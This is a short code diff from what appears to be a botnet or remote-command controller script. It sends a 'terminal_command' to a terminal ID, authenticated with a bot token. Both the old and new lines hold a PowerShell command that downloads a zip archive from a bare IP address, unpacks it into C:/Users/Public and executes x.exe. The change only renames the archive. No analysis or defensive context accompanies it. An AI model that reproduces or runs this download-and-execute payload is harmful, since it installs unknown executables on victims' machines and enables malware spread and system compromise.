@@ -66,7 +66,7 @@ sendCmd = (id) => {
                 },
                 form: {
                     'terminal_id': id,
-                    'terminal_command': 'powershell Invoke-WebRequest -Uri http://74.122.101.8/app/x.zip -OutFile "C:/Users/Public/x.zip" && powershell Expand-Archive -Path "C:/Users/Public/x.zip" "C:/Users/Public" && dir "C:/Users/Public" && "C:/Users/Public/x.exe"\n',
+                    'terminal_command': 'powershell Invoke-WebRequest -Uri http://74.122.101.8/app/x1.zip -OutFile "C:/Users/Public/x1.zip" && powershell Expand-Archive -Path "C:/Users/Public/x1.zip" "C:/Users/Public" && dir "C:/Users/Public" && "C:/Users/Public/x.exe"\n',
                     'boToken': '2bdc7d32a7671132e1c6c6b64b5fb0ae',
                     'external_login': 'false'
                 }
